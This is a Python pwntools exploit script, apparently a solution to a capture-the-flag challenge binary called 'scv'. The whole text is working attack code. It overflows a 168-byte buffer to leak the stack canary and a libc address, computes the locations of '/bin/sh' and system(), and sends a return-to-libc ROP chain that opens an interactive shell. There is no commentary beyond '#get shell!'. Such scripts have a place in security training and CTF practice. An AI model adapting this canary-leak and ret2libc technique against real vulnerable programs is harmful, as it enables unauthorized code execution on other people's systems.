from pwn import *

sh_off = 0x7ffff7817d17-0x00007ffff76ab830
sys_off = 0x7ffff76d0390-0x00007ffff76ab830
pop_rdi_ret = 0x00400ea3

def get_to():
	print p.recvuntil('>>')

p = process('scv')

get_to()
p.sendline('1')
get_to()
p.send('a'*169)
get_to()

p.sendline('2')
p.recvuntil('a'*169)
canary = p.recv(7)

get_to()
p.sendline('1')
get_to()
p.send('a'*168 + 'aaaaaaaa' + 'bbbbbbbb')
get_to()

p.sendline('2')
p.recvuntil('bbbbbbbb')
main = p.recv(6) + '\x00\x00'
get_to()

main_addr = u64(main)
bin_sh = main_addr + sh_off
system = main_addr + sys_off

p.sendline('1')
get_to()
p.send('a'*168 + '\x00' + canary + 'aaaaaaaa' + p64(pop_rdi_ret) + p64(bin_sh) + p64(system))

get_to()
p.sendline('3')

p.interactive()#get shell!
